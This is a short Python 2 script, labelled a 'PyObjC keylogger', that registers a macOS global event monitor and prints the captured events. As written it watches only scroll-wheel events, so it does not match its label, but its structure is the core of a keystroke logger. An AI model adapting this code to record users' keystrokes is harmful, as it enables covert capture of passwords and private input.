#!/usr/bin/python2.6

"""PyObjC keylogger for Python
by  ljos https://github.com/ljos
"""

from Cocoa import *
import time
#from Foundation import *
from PyObjCTools import AppHelper

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSScrollWheelMask, handler)
        return

def handler(event):
    print event;
    #NSLog(u"%@", event)

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
   main()
